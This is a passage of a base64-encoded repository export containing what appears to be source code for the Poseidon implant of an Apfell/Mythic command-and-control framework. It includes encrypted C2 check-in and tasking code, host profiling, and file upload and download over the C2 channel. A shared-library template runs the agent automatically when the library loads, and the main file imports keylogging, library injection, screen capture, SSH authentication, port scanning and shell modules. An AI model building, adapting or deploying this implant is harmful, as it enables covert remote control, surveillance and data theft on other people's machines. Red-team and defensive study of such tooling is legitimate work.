ZW4gZm9yIG1lc3NhZ2VzIG9uIHRoZSBraWxsIGNoYW5uZWwsCi8vIHNldCB0aGUgU3RvcCBwYXJhbSB0byBhbiBleGl0IGNvZGUsIGFuZCBjaGVja3MgaWYgaXQncyBpbiBhCi8vIG1vbml0b3Jpbmcgc3RhdGUuCgovL0ZpbGVSZWdpc3RlclJlc3BvbnNlIHVzZWQgZm9yIGhvbGRpbmcgdGhlIHJlc3BvbnNlIGFmdGVyIGZpbGUgcmVnaXN0cmF0aW9uCnR5cGUgRmlsZVJlZ2lzdGVyUmVzcG9uc2Ugc3RydWN0IHsKCVN0YXR1cyBzdHJpbmcgYGpzb246InN0YXR1cyJgCglGaWxlSUQgc3RyaW5nIGBqc29uOiJmaWxlX2lkImAKfQoKLy8gRmlsZVJlZ2lzdGVyUmVxdWVzdCB1c2VkIHRvIHJlZ2lzdGVyIGEgZmlsZSBkb3dubG9hZAp0eXBlIEZpbGVSZWdpc3RlclJlcXVlc3Qgc3RydWN0IHsKCUNodW5rcyBpbnQgICAgYGpzb246InRvdGFsX2NodW5rcyJgCglUYXNrICAgc3RyaW5nIGBqc29uOiJ0YXNrImAKfQoKLy8gTmVzdGVkQXBmZWxsVGFza1Jlc3BvbnNlIHVzZWQgdG8gaG9sZCB0aGUgdGFzayByZXNwb25zZSBmaWVsZAp0eXBlIE5lc3RlZEFwZmVsbFRhc2tSZXNwb25zZSBzdHJ1Y3QgewoJU3RhdHVzICAgIHN0cmluZyBganNvbjoic3RhdHVzImAKCVRpbWVzdGFtcCBzdHJpbmcgYGpzb246InRpbWVzdGFtcCJgCglDb21tYW5kICAgc3RyaW5nIGBqc29uOiJjb21tYW5kImAKCVBhcmFtcyAgICBzdHJpbmcgYGpzb246InBhcmFtcyJgCglBdHRhY2tJRCAgaW50ICAgIGBqc29uOiJhdHRhY2tfaWQiYAoJQ2FsbGJhY2sgIGludCAgICBganNvbjoiY2FsbGJhY2siYAoJT3BlcmF0b3IgIHN0cmluZyBganNvbjoib3BlcmF0b3IiYAp9CgovLyBGaWxlQ2h1bmsgdXNlZCB0byBzZW5kIGEgZmlsZSBkb3dubG9hZCBjaHVuayB0byBhcGZlbGwKdHlwZSBGaWxlQ2h1bmsgc3RydWN0IHsKCUNodW5rTnVtYmVyIGludCAgICBganNvbjoiY2h1bmtfbnVtImAKCUNodW5rRGF0YSAgIHN0cmluZyBganNvbjoiY2h1bmtfZGF0YSJgCglGaWxlSUQgICAgICBzdHJpbmcgYGpzb246ImZpbGVfaWQiYAp9CgovLyBGaWxlQ2h1bmtSZXNwb25zZSB1c2VkIHRvIGhhbmRsZSB0aGUgRmlsZUNodW5rIHJlc3BvbnNlIGZyb20gQXBmZWxsCnR5cGUgRmlsZUNodW5rUmVzcG9uc2Ugc3RydWN0IHsKCVN0YXR1cyBzdHJpbmcgYGpzb246InN0YXR1cyJgCn0KCi8vRmlsZVVwbG9hZFBhcmFtcyAtIGhhbmRsZSBwYXJhbWV0ZXJzIGZvciB0aGUgZmlsZSB1cGxvYWQgcmVzcG9uc2UKdHlwZSBGaWxlVXBsb2FkUGFyYW1zIHN0cnVjdCB7CglGaWxlSUQgICAgIHN0cmluZyBganNvbjoiZmlsZV9pZCJgCglSZW1vdGVQYXRoIHN0cmluZyBganNvbjoicmVtb3RlX3BhdGgiYAp9CgovLyBDaGVja0luU3RydWN0IHVzZWQgZm9yIENoZWNraW4gbWVzc2FnZXMgdG8gQXBmZWxsCnR5cGUgQ2hlY2tJblN0cnVjdCBzdHJ1Y3QgewoJVXNlciAgICAgICAgICAgc3RyaW5nIGBqc29uOiJ1c2VyImAKCUhvc3QgICAgICAgICAgIHN0cmluZyBganNvbjoiaG9zdCJgCglQaWQgICAgICAgICAgICBpbnQgICAgYGpzb246InBpZCJgCglJUCAgICAgICAgICAgICBzdHJpbmcgYGpzb246ImlwImAKCVVVSUQgICAgICAgICAgIHN0cmluZyBganNvbjoidXVpZCJgCglJbnRlZ3JpdHlMZXZlbCBpbnQgICAgYGpzb246ImludGVncml0eV9sZXZlbCJgCn0KCi8vIE1vbml0b3JTdG9wIHRlbGxzIHRoZSBqb2IgdGhhdCBpdCBuZWVkcyB0byB3YWl0IGZvciBhIGtpbGwgc2lnbmFsLgovLyBUaGUgaW5kaXZpZHVhbCBtb2R1bGUgaXMgcmVxdWlyZWQgdG8gbGlzdGVuIGZvciB0aGUgam9iLlN0b3AKLy8gdmFyaWFibGUgdG8gYmUgPiAwLCBhbmQgdGFrZSByZXF1aXNpdGUgYWN0aW9ucyB0byB0ZWFyLWRvd24uCmZ1bmMgKGogKkpvYikgTW9uaXRvclN0b3AoKSB7CglpZiAhai5Nb25pdG9yaW5nIHsKCQlqLk1vbml0b3JpbmcgPSB0cnVlCgkJZm9yIHsKCQkJc2VsZWN0IHsKCQkJY2FzZSA8LWouS2lsbENoYW5uZWw6CgkJCQlsb2cuUHJpbnRsbigiR290IGtpbGwgbWVzc2FnZSBmb3Igam9iIikKCQkJCSpqLlN0b3AgPSAxCgkJCQlqLk1vbml0b3JpbmcgPSBmYWxzZQoJCQkJcmV0dXJuCgkJCWRlZmF1bHQ6CgkJCQkvLyDDosKAwqYKCQkJCS8vIGxvZy5QcmludGxuKCJTbGVlcGluZyBpbiB0aGUga2lsbCBjaGFuLi4uIikKCQkJCXRpbWUuU2xlZXAodGltZS5TZWNvbmQpCgkJCX0KCQl9Cgl9Cn0KCi8vIFNlbmRLaWxsIHNlbmRzIGEga2lsbCBtZXNzYWdlIHRvIHRoZSBjaGFubmVsLgpmdW5jIChqICpKb2IpIFNlbmRLaWxsKCkgewoJai5LaWxsQ2hhbm5lbCA8LSAxCn0KCi8vIFRvU3R1YiBjb252ZXJ0cyBhIFRhc2sgaXRlbSB0byBhIFRhc2tTdHViIHRoYXQncyBlYXNpbHkKLy8gdHJhbnNwb3J0YWJsZSBiZXR3ZWVuIGNsaWVudCBhbmQgc2VydmVyLgpmdW5jICh0ICpUYXNrKSBUb1N0dWIoKSBUYXNrU3R1YiB7CglyZXR1cm4gVGFza1N0dWJ7CgkJQ29tbWFuZDogdC5Db21tYW5kLAoJCUlEOiAgICAgIHQuVGFza0lELAoJCVBhcmFtczogIHQuUGFyYW1zLAoJfQp9"
        },
        {
          "pkg\/utils\/functions\/functions_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBmdW5jdGlvbnMKLyoKI2NnbyBDRkxBR1M6IC14IG9iamVjdGl2ZS1jCiNjZ28gTERGTEFHUzogLWZyYW1ld29yayBGb3VuZGF0aW9uCiNpbmNsdWRlICJmb3VuZGF0aW9uX2Rhcndpbi5oIgoqLwppbXBvcnQgIkMiCmltcG9ydCAoCgkiZm10IgoJInVuaWNvZGUvdXRmMTYiCgkib3MvdXNlciIKCSJvcyIKCSJydW50aW1lIgopCmZ1bmMgY3N0cmluZyhzICpDLk5TU3RyaW5nKSAqQy5jaGFyIHsgcmV0dXJuIEMubnNzdHJpbmcyY3N0cmluZyhzKSB9CmZ1bmMgZ29zdHJpbmcocyAqQy5OU1N0cmluZykgc3RyaW5nIHsgcmV0dXJuIEMuR29TdHJpbmcoY3N0cmluZyhzKSkgfQpmdW5jIGlzRWxldmF0ZWQoKSBib29sIHsKCWN1cnJlbnRVc2VyLCBfIDo9IHVzZXIuQ3VycmVudCgpCglyZXR1cm4gY3VycmVudFVzZXIuVWlkID09ICIwIgp9CmZ1bmMgZ2V0QXJjaGl0ZWN0dXJlKCkgc3RyaW5newogICAgcmV0dXJuIHJ1bnRpbWUuR09BUkNICn0KZnVuYyBnZXREb21haW4oKSBzdHJpbmd7CiAgICBob3N0LCBfIDo9IG9zLkhvc3RuYW1lKCkKICAgIHJldHVybiBob3N0Cn0KZnVuYyBnZXRPUygpIHN0cmluZ3sKICAgIHJldHVybiBnb3N0cmluZyggQy5HZXRPU1ZlcnNpb24oKSApOwogICAgLy9yZXR1cm4gcnVudGltZS5HT09TCn0KLy8gSGVscGVyIGZ1bmN0aW9uIHRvIGNvbnZlcnQgRFdPUkQgYnl0ZSBjb3VudHMgdG8KLy8gaHVtYW4gcmVhZGFibGUgc2l6ZXMuCmZ1bmMgVUlOVDMyQnl0ZUNvdW50RGVjaW1hbChiIHVpbnQzMikgc3RyaW5nIHsKCWNvbnN0IHVuaXQgPSAxMDI0CglpZiBiIDwgdW5pdCB7CgkJcmV0dXJuIGZtdC5TcHJpbnRmKCIlZCBCIiwgYikKCX0KCWRpdiwgZXhwIDo9IHVpbnQzMih1bml0KSwgMAoJZm9yIG4gOj0gYiAvIHVuaXQ7IG4gPj0gdW5pdDsgbiAvPSB1bml0IHsKCQlkaXYgKj0gdW5pdAoJCWV4cCsrCgl9CglyZXR1cm4gZm10LlNwcmludGYoIiUuMWYgJWNCIiwgZmxvYXQzMihiKS9mbG9hdDMyKGRpdiksICJrTUdUUEUiW2V4cF0pCn0KCi8vIEhlbHBlciBmdW5jdGlvbiB0byBjb252ZXJ0IExBUkdFX0lOVEVHRVIgYnl0ZQovLyAgY291bnRzIHRvIGh1bWFuIHJlYWRhYmxlIHNpemVzLgpmdW5jIFVJTlQ2NEJ5dGVDb3VudERlY2ltYWwoYiB1aW50NjQpIHN0cmluZyB7Cgljb25zdCB1bml0ID0gMTAyNAoJaWYgYiA8IHVuaXQgewoJCXJldHVybiBmbXQuU3ByaW50ZigiJWQgQiIsIGIpCgl9CglkaXYsIGV4cCA6PSB1aW50NjQodW5pdCksIDAKCWZvciBuIDo9IGIgLyB1bml0OyBuID49IHVuaXQ7IG4gLz0gdW5pdCB7CgkJZGl2ICo9IHVuaXQKCQlleHArKwoJfQoJcmV0dXJuIGZtdC5TcHJpbnRmKCIlLjFmICVjQiIsIGZsb2F0NjQoYikvZmxvYXQ2NChkaXYpLCAia01HVFBFIltleHBdKQp9CgovLyBIZWxwZXIgZnVuY3Rpb24gdG8gYnVpbGQgYSBzdHJpbmcgZnJvbSBhIFdDSEFSIHN0cmluZwpmdW5jIFVURjE2VG9TdHJpbmcocyBbXXVpbnQxNikgW11zdHJpbmcgewoJdmFyIHJlc3VsdHMgW11zdHJpbmcKCWN1dCA6PSAwCglmb3IgaSwgdiA6PSByYW5nZSBzIHsKCQlpZiB2ID09IDAgewoJCQlpZiBpLWN1dCA+IDAgewoJCQkJcmVzdWx0cyA9IGFwcGVuZChyZXN1bHRzLCBzdHJpbmcodXRmMTYuRGVjb2RlKHNbY3V0OmldKSkpCgkJCX0KCQkJY3V0ID0gaSArIDEKCQl9Cgl9CglpZiBjdXQgPCBsZW4ocykgewoJCXJlc3VsdHMgPSBhcHBlbmQocmVzdWx0cywgc3RyaW5nKHV0ZjE2LkRlY29kZShzW2N1dDpdKSkpCgl9CglyZXR1cm4gcmVzdWx0cwp9Cg=="
        },
        {
          "pkg\/utils\/functions\/functions.go": "cGFja2FnZSBmdW5jdGlvbnMKCmltcG9ydCAoCgkibmV0IgopCgovL0dldEN1cnJlbnRJUEFkZHJlc3MgLSB0aGUgY3VycmVudCBJUCBhZGRyZXNzIG9mIHRoZSBzeXN0ZW0KZnVuYyBHZXRDdXJyZW50SVBBZGRyZXNzKCkgc3RyaW5nIHsKCWFkZHJzLCBlcnIgOj0gbmV0LkludGVyZmFjZUFkZHJzKCkKCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gIjEyNy4wLjAuMSIKCX0KCgljdXJySVAgOj0gIjAuMC4wLjAiCglmb3IgXywgYWRkcmVzcyA6PSByYW5nZSBhZGRycyB7CgoJCS8vIGNoZWNrIHRoZSBhZGRyZXNzIHR5cGUgYW5kIGlmIGl0IGlzIG5vdCBhIGxvb3BiYWNrIHRoZSBkaXNwbGF5IGl0CgkJLy8gPSBHRVQgTE9DQUwgSVAgQUREUkVTUwoJCWlmIGlwbmV0LCBvayA6PSBhZGRyZXNzLigqbmV0LklQTmV0KTsgb2sgJiYgIWlwbmV0LklQLklzTG9vcGJhY2soKSB7CgkJCWlmIGlwbmV0LklQLlRvNCgpICE9IG5pbCB7CgkJCQkvL2ZtdC5QcmludGxuKCJDdXJyZW50IElQIGFkZHJlc3MgOiAiLCBpcG5ldC5JUC5TdHJpbmcoKSkKCQkJCWN1cnJJUCA9IGlwbmV0LklQLlN0cmluZygpCgkJCX0KCQl9Cgl9CgoJcmV0dXJuIGN1cnJJUAp9CgpmdW5jIElzRWxldmF0ZWQoKSBib29sIHsKCXJldHVybiBpc0VsZXZhdGVkKCkKfQpmdW5jIEdldEFyY2hpdGVjdHVyZSgpIHN0cmluZ3sKICAgIHJldHVybiBnZXRBcmNoaXRlY3R1cmUoKQp9CmZ1bmMgR2V0RG9tYWluKCkgc3RyaW5newogICAgcmV0dXJuIGdldERvbWFpbigpCn0KZnVuYyBHZXRPUygpIHN0cmluZ3sKICAgIHJldHVybiBnZXRPUygpCn0K"
        },
        {
          "pkg\/utils\/functions\/foundation_darwin.h": "I2ltcG9ydCA8Rm91bmRhdGlvbi9Gb3VuZGF0aW9uLmg+Cgpjb25zdCBjaGFyKiBuc3N0cmluZzJjc3RyaW5nKE5TU3RyaW5nKik7CmNvbnN0IE5TU3RyaW5nKiBHZXRPU1ZlcnNpb24oKTs="
        },
        {
          "pkg\/utils\/functions\/functions_linux.go": "Ly8gK2J1aWxkIGxpbnV4CgpwYWNrYWdlIGZ1bmN0aW9ucwoKaW1wb3J0ICgKCSJmbXQiCgkidW5pY29kZS91dGYxNiIKCSJvcy91c2VyIgoJIm9zIgoJInJ1bnRpbWUiCikKCmZ1bmMgaXNFbGV2YXRlZCgpIGJvb2wgewoJY3VycmVudFVzZXIsIF8gOj0gdXNlci5DdXJyZW50KCkKCXJldHVybiBjdXJyZW50VXNlci5VaWQgPT0gIjAiCn0KZnVuYyBnZXRBcmNoaXRlY3R1cmUoKSBzdHJpbmd7CiAgICByZXR1cm4gcnVudGltZS5HT0FSQ0gKfQpmdW5jIGdldERvbWFpbigpIHN0cmluZ3sKICAgIGhvc3QsIF8gOj0gb3MuSG9zdG5hbWUoKQogICAgcmV0dXJuIGhvc3QKfQpmdW5jIGdldE9TKCkgc3RyaW5newogICAgcmV0dXJuIHJ1bnRpbWUuR09PUwp9Ci8vIEhlbHBlciBmdW5jdGlvbiB0byBjb252ZXJ0IERXT1JEIGJ5dGUgY291bnRzIHRvCi8vIGh1bWFuIHJlYWRhYmxlIHNpemVzLgpmdW5jIFVJTlQzMkJ5dGVDb3VudERlY2ltYWwoYiB1aW50MzIpIHN0cmluZyB7Cgljb25zdCB1bml0ID0gMTAyNAoJaWYgYiA8IHVuaXQgewoJCXJldHVybiBmbXQuU3ByaW50ZigiJWQgQiIsIGIpCgl9CglkaXYsIGV4cCA6PSB1aW50MzIodW5pdCksIDAKCWZvciBuIDo9IGIgLyB1bml0OyBuID49IHVuaXQ7IG4gLz0gdW5pdCB7CgkJZGl2ICo9IHVuaXQKCQlleHArKwoJfQoJcmV0dXJuIGZtdC5TcHJpbnRmKCIlLjFmICVjQiIsIGZsb2F0MzIoYikvZmxvYXQzMihkaXYpLCAia01HVFBFIltleHBdKQp9CgovLyBIZWxwZXIgZnVuY3Rpb24gdG8gY29udmVydCBMQVJHRV9JTlRFR0VSIGJ5dGUKLy8gIGNvdW50cyB0byBodW1hbiByZWFkYWJsZSBzaXplcy4KZnVuYyBVSU5UNjRCeXRlQ291bnREZWNpbWFsKGIgdWludDY0KSBzdHJpbmcgewoJY29uc3QgdW5pdCA9IDEwMjQKCWlmIGIgPCB1bml0IHsKCQlyZXR1cm4gZm10LlNwcmludGYoIiVkIEIiLCBiKQoJfQoJZGl2LCBleHAgOj0gdWludDY0KHVuaXQpLCAwCglmb3IgbiA6PSBiIC8gdW5pdDsgbiA+PSB1bml0OyBuIC89IHVuaXQgewoJCWRpdiAqPSB1bml0CgkJZXhwKysKCX0KCXJldHVybiBmbXQuU3ByaW50ZigiJS4xZiAlY0IiLCBmbG9hdDY0KGIpL2Zsb2F0NjQoZGl2KSwgImtNR1RQRSJbZXhwXSkKfQoKLy8gSGVscGVyIGZ1bmN0aW9uIHRvIGJ1aWxkIGEgc3RyaW5nIGZyb20gYSBXQ0hBUiBzdHJpbmcKZnVuYyBVVEYxNlRvU3RyaW5nKHMgW111aW50MTYpIFtdc3RyaW5nIHsKCXZhciByZXN1bHRzIFtdc3RyaW5nCgljdXQgOj0gMAoJZm9yIGksIHYgOj0gcmFuZ2UgcyB7CgkJaWYgdiA9PSAwIHsKCQkJaWYgaS1jdXQgPiAwIHsKCQkJCXJlc3VsdHMgPSBhcHBlbmQocmVzdWx0cywgc3RyaW5nKHV0ZjE2LkRlY29kZShzW2N1dDppXSkpKQoJCQl9CgkJCWN1dCA9IGkgKyAxCgkJfQoJfQoJaWYgY3V0IDwgbGVuKHMpIHsKCQlyZXN1bHRzID0gYXBwZW5kKHJlc3VsdHMsIHN0cmluZyh1dGYxNi5EZWNvZGUoc1tjdXQ6XSkpKQoJfQoJcmV0dXJuIHJlc3VsdHMKfQo="
        },
        {
          "pkg\/utils\/functions\/foundation_darwin.m": "I2ltcG9ydCAiZm91bmRhdGlvbl9kYXJ3aW4uaCIKY29uc3QgY2hhcioKbnNzdHJpbmcyY3N0cmluZyhOU1N0cmluZyAqcykgewogICAgaWYgKHMgPT0gTlVMTCkgeyByZXR1cm4gTlVMTDsgfQoKICAgIGNvbnN0IGNoYXIgKmNzdHIgPSBbcyBVVEY4U3RyaW5nXTsKICAgIHJldHVybiBjc3RyOwp9Cgpjb25zdCBOU1N0cmluZyogR2V0T1NWZXJzaW9uKCl7CiAgICBOU1N0cmluZyAqIG9wZXJhdGluZ1N5c3RlbVZlcnNpb25TdHJpbmcgPSBbW05TUHJvY2Vzc0luZm8gcHJvY2Vzc0luZm9dIG9wZXJhdGluZ1N5c3RlbVZlcnNpb25TdHJpbmddOwogICAgcmV0dXJuIG9wZXJhdGluZ1N5c3RlbVZlcnNpb25TdHJpbmc7Cn0="
        },
        {
          "pkg\/profiles\/profile.go": "cGFja2FnZSBwcm9maWxlcwoKaW1wb3J0ICgKCSJlbmNvZGluZy9iYXNlNjQiCgkicGtnL3V0aWxzL2NyeXB0byIKCSJtYXRoL3JhbmQiCgkidGltZSIKCSJwa2cvdXRpbHMvc3RydWN0cyIKCSJlbmNvZGluZy9qc29uIgopCgp2YXIgKAoJQXBpVmVyc2lvbiA9ICIxLjQiCglzZWVkZWRSYW5kICAgKnJhbmQuUmFuZCA9IHJhbmQuTmV3KHJhbmQuTmV3U291cmNlKHRpbWUuTm93KCkuVW5peE5hbm8oKSkpCglVVUlEID0gIlVVSURfSEVSRSIKCVRhc2tSZXNwb25zZXMgW11qc29uLlJhd01lc3NhZ2UKCVVwbG9hZFJlc3BvbnNlcyBbXWpzb24uUmF3TWVzc2FnZQopCgovL1Byb2ZpbGUgLSBQcmltYXJ5IGludGVyZmFjZSBmb3IgYXBmZWxsIEMyIHByb2ZpbGVzCnR5cGUgUHJvZmlsZSBpbnRlcmZhY2UgewoJQ2hlY2tJbihpcCBzdHJpbmcsIHBpZCBpbnQsIHVzZXIgc3RyaW5nLCBob3N0IHN0cmluZywgb3Mgc3RyaW5nLCBhcmNoIHN0cmluZykgaW50ZXJmYWNle30gLy8gQ2hlY2tJbiBtZXRob2QgZm9yIHNlbmRpbmcgdGhlIGluaXRpYWwgY2hlY2tpbiB0byB0aGUgc2VydmVyCglHZXRUYXNraW5nKCkgaW50ZXJmYWNle30gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBHZXRUYXNraW5nIG1ldGhvZCBmb3IgcmV0cmlldmluZyB0aGUgbmV4dCB0YXNrIGZyb20gYXBmZWxsCglQb3N0UmVzcG9uc2Uob3V0cHV0IFtdYnl0ZSwgc2tpcENodW5raW5nIGJvb2wpIFtdYnl0ZSAgICAgICAgICAgICAvLyBQb3N0IGEgdGFzayByZXNwb25zZSB0byB0aGUgc2VydmVyCglOZWdvdGlhdGVLZXkoKSBzdHJpbmcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBTdGFydCBFS0Uga2V5IG5lZ290aWF0aW9uIGZvciBlbmNyeXB0ZWQgY29tbXMKCVNlbmRGaWxlKHRhc2sgc3RydWN0cy5UYXNrLCBwYXJhbXMgc3RyaW5nLCBjaCBjaGFuIFtdYnl0ZSkgICAgICAgICAgICAgICAgICAgICAgICAvLyBDMiBwcm9maWxlIGltcGxlbWVudGF0aW9uIGZvciBkb3dubG9hZGluZyBmaWxlcwoJR2V0RmlsZSh0YXNrIHN0cnVjdHMuVGFzaywgZmlsZURldGFpbHMgc3RydWN0cy5GaWxlVXBsb2FkUGFyYW1zLCBjaCBjaGFuIFtdYnl0ZSkgICAgICAgICAgICAgICAgLy8gQzIgUHJvZmlsZSBpbXBsZW1lbnRhdGlvbiB0byBnZXQgYSBmaWxlIHdpdGggc3BlY2lmaWVkIGlkIC8vIEMyIHByb2ZpbGUgaGVscGVyIGZ1bmN0aW9uIHRvIHJldHJpZXZlIGFueSBhcmJpdHJhcnkgdmFsdWUgZm9yIGEgcHJvZmlsZQoJU2VuZEZpbGVDaHVua3ModGFzayBzdHJ1Y3RzLlRhc2ssIGRhdGEgW11ieXRlLCBjaCBjaGFuIFtdYnl0ZSkgICAgICAgICAgICAgICAgICAgIC8vIEMyIGhlbHBlciBmdW5jdGlvbiB0byB1cGxvYWQgYSBmaWxlCglTbGVlcEludGVydmFsKCkgaW50CglTZXRTbGVlcEludGVydmFsKGludGVydmFsIGludCkKCVNldFNsZWVwSml0dGVyKGppdHRlciBpbnQpCglBcGZJRCgpIHN0cmluZwoJU2V0QXBmZWxsSUQobmV3SUQgc3RyaW5nKQoJUHJvZmlsZVR5cGUoKSBzdHJpbmcKfQoKZnVuYyBOZXdJbnN0YW5jZSgpIGludGVyZmFjZXt9IHsKCXJldHVybiBuZXdQcm9maWxlKCkKfQoKZnVuYyBFbmNyeXB0TWVzc2FnZShtc2cgW11ieXRlLCBrIHN0cmluZykgW11ieXRlIHsKCWtleSwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlU3RyaW5nKGspCglyZXR1cm4gY3J5cHRvLkFlc0VuY3J5cHQoa2V5LCBtc2cpCn0KCmZ1bmMgRGVjcnlwdE1lc3NhZ2UobXNnIFtdYnl0ZSwgayBzdHJpbmcpIFtdYnl0ZSB7CglrZXksIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhrKQoJcmV0dXJuIGNyeXB0by5BZXNEZWNyeXB0KGtleSwgbXNnKQp9CgpmdW5jIEdlbmVyYXRlU2Vzc2lvbklEKCkgc3RyaW5nIHsKCWNvbnN0IGxldHRlckJ5dGVzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IgoJYiA6PSBtYWtlKFtdYnl0ZSwgMjApCglmb3IgaSA6PSByYW5nZSBiIHsKCQliW2ldID0gbGV0dGVyQnl0ZXNbc2VlZGVkUmFuZC5JbnRuKGxlbihsZXR0ZXJCeXRlcykpXQoJfQoJcmV0dXJuIHN0cmluZyhiKQp9"
        },
        {
          "sharedlib-darwin-linux.c": "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8d2NoYXIuaD4KI2luY2x1ZGUgPGFzc2VydC5oPgojaW5jbHVkZSA8cHRocmVhZC5oPgojaW5jbHVkZSAiZGVmYXVsdC5oIiAvL0NoYW5nZSB0aGUgaGVhZGVyIGZpbGUgbmFtZSAKLy8gVG8gYnVpbGQgOgovLyAxLiBCdWlsZCBhIGMtYXJjaGl2ZSBpbiBnb2xhbmc6IGdvIGJ1aWxkIC1idWlsZG1vZGU9Yy1hcmNoaXZlIC1vIHdoYXRldmVyLmEgLXRhZ3M9W3Byb2ZpbGVdIGNtZC9hZ2VudC9tYWluLmdvCi8vIDIuIEJ1aWxkIGEgc2hhcmVkIGxpYiAoZGFyd2luKTogY2xhbmcgLXNoYXJlZCAtZnJhbWV3b3JrIEZvdW5kYXRpb24gLWZyYW1ld29yayBDb3JlR3JhcGhpY3MgLWZyYW1ld29yayBTZWN1cml0eSAtZnBpYyBwYXlsb2FkLXRlbXBsYXRlLmMgd2hhdGV2ZXIuYSAtbyB3aGF0ZXZlci5keWxpYgoKX19hdHRyaWJ1dGVfXyAoKGNvbnN0cnVjdG9yKSkgdm9pZCBpbml0aWFsaXplcigpCnsKCXB0aHJlYWRfYXR0cl90ICBhdHRyOwogICAgcHRocmVhZF90ICAgICAgIHBvc2l4VGhyZWFkSUQ7CiAgICBpbnQgICAgICAgICAgICAgcmV0dXJuVmFsOwogICAgCiAgICByZXR1cm5WYWwgPSBwdGhyZWFkX2F0dHJfaW5pdCgmYXR0cik7CiAgICBhc3NlcnQoIXJldHVyblZhbCk7CiAgICByZXR1cm5WYWwgPSBwdGhyZWFkX2F0dHJfc2V0ZGV0YWNoc3RhdGUoJmF0dHIsIFBUSFJFQURfQ1JFQVRFX0RFVEFDSEVEKTsKICAgIGFzc2VydCghcmV0dXJuVmFsKTsKICAgIHB0aHJlYWRfY3JlYXRlKCZwb3NpeFRocmVhZElELCAmYXR0ciwgJlJ1bk1haW4sIE5VTEwpOwp9"
        },
        {
          "poseidon.go": "cGFja2FnZSBtYWluCgppbXBvcnQgKAoJIkMiCgkiZW5jb2RpbmcvanNvbiIKCSJmbXQiCgkib3MiCgkib3MvdXNlciIKCSJzdHJpbmdzIgoJInRpbWUiCgkvLyJsb2ciCgkic29ydCIKCSJjYXQiCgkia2V5cyIKCSJjdXJsIgoJImp4YSIKCSJsaWJpbmplY3QiCgkibHMiCgkicG9ydHNjYW4iCgkicHMiCgkic2NyZWVuY2FwdHVyZSIKCSJzaGVsbCIKCSJzc2hhdXRoIgoJInRyaWFnZWRpcmVjdG9yeSIKCSJjcCIKCSJkcml2ZXMiCgkiZ2V0ZW52IgoJImdldHVzZXIiCgkia2V5bG9nIgoJImtpbGwiCgkibWtkaXIiCgkibXYiCgkicHdkIgoJInJtIgoJInhwYyIKCSJzZXRlbnYiCgkidW5zZXRlbnYiCgkicGtnL3Byb2ZpbGVzIgoJInBrZy91dGlscy9mdW5jdGlvbnMiCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkic3luYyIKCQopCgpjb25zdCAoCglOT05FX0NPREUgPSAxMDAKCUVYSVRfQ09ERSA9IDAKKQoKdmFyIHRhc2tTbGljZSBbXXN0cnVjdHMuVGFzawp2YXIgbXUgc3luYy5NdXRleAoKLy9leHBvcnQgUnVuTWFpbgpmdW5jIFJ1bk1haW4oKSB7CgltYWluKCkKfQoKLy9oZWxwZXIgdG8gZ2V0IHRoZSB0b3RhbCBzaXplIGluIGJ5dGVzIG9mIHRoZSB0YXNrcmVzcG9uc2Ugc2xpY2UKZnVuYyB0b3RhbFNpemUociBbXWpzb24uUmF3TWVzc2FnZSkgaW50IHsKCXMgOj0gMAoKCWZvciBpIDo9IDA7IGkgPCBsZW4ocik7IGkrKyB7CgkJcyA9IHMgKyBsZW4ocltpXSkKCX0KCglyZXR1cm4gcwp9CgovLyBIYW5kbGUgRmlsZSB1cGxvYWQgcmVzcG9uc2VzIGZyb20gYXBmZWxsCmZ1bmMgaGFuZGxlRmlsZVVwbG9hZFJlc3BvbnNlKHJlc3AgW11ieXRlLCBiYWNrZ3JvdW5kVGFza3MgbWFwW3N0cmluZ10oY2hhbiBbXWJ5dGUpKSB7Cgl2YXIgdGFza1Jlc3AgbWFwW3N0cmluZ11pbnRlcmZhY2V7fQoJZXJyIDo9IGpzb24uVW5tYXJzaGFsKHJlc3AsICZ0YXNrUmVzcCkKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50ZigiRXJyb3IgdW5tYXJzaGFsIHJlc3BvbnNlIHRvIHRhc2sgcmVzcG9uc2U6ICVzIiwgZXJyLkVycm9yKCkpCgl9CgoJaWYgZmlsZWlkLCBvayA6PSB0YXNrUmVzcFsiZmlsZV9pZCJdOyBvayB7CgkJaWYgdiwgZXhpc3RzIDo9IGJhY2tncm91bmRUYXNrc1tmaWxlaWQuKHN0cmluZyldOyBleGlzdHMgewoJCQkvLyBzZW5kIGRhdGEgdG8gdGhlIGNoYW5uZWwKCQkJcmF3LCBfIDo9IGpzb24uTWFyc2hhbCh0YXNrUmVzcCkKCQkJZ28gZnVuYygpIHsKCQkJCXYgPC0gcmF3CgkJCX0oKQoJCX0KCX0KfQoKLy8gSGFuZGxlIFNjcmVlbnNob3QgZGF0YQpmdW5jIGhhbmRsZVNjcmVlbnNob3QocHJvZmlsZSBwcm9maWxlcy5Qcm9maWxlLCB0YXNrIHN0cnVjdHMuVGFzaywgYmFja2dyb3VuZGNoYW5uZWwgY2hhbiBbXWJ5dGUsIGRhdGFDaGFubmVsIGNoYW4gW11zY3JlZW5jYXB0dXJlLlNjcmVlblNob3QsIGJhY2tncm91bmRUYXNrcyBtYXBbc3RyaW5nXShjaGFuIFtdYnl0ZSkpIHsKCXJlc3VsdHMgOj0gPC0gZGF0YUNoYW5uZWwKCQoJZm9yIGkgOj0gMDsgaSA8IGxlbihyZXN1bHRzKTsgaSsrIHsKCQkvL2xvZy5QcmludGxuKCJDYWxsaW5nIHByb2ZpbGUuU2VuZEZpbGVDaHVua3MgZm9yIHNjcmVlbnNob3QgIiwgaSkKCQlwcm9maWxlLlNlbmRGaWxlQ2h1bmtzKHRhc2ssIHJlc3VsdHNbaV0uRGF0YSgpLCBiYWNrZ3JvdW5kY2hhbm5lbCkKCX0KCglkZWxldGUoYmFja2dy